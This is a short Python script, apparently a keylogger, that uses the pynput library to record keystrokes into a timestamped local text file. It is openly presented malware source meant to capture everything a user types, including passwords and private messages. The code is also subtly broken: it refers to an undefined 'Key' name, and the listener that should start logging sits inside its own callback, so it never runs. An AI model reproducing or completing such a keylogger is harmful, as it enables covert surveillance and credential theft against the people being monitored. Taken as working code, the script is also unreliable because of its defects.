import datetime
from pynput.keyboard import Listener

d = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')

f = open('keylogger_{}.txt'.format(d), 'w')


def key_recorder(key):
    key = str(key)

    if key == 'Key.enter':
        f.write('\n')

    elif Key == 'Key.space':
        f.write('')

    elif Key == 'Key.backspace':
        f.write('%BORRAR%')

    else:
        f.write(key.replace("''", ""))

    with Listener(on_press=key_recorder) as l:
        l.join()


